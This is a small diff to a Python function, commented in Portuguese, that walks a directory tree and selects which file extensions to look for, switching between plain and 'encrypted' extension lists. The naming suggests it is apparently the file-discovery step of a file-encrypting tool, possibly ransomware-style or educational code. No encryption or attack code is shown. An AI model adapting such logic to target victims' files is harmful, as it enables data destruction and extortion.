@@ -45,10 +45,11 @@ def discover(initial_path, encrypted=False):
     ]
 
     # Define as extensões que o arquivo deverá buscar
-    if encrypted:
-        extList = extensions
-    else:
-        extList = encrypted_extensions
+    # if encrypted:
+    #     extList = encrypted_extensions
+    # else:
+    #     extList = extensions
+    extList = extensions
 
     # dirpath - caminho atual
     # dirs - pastas no caminho atual
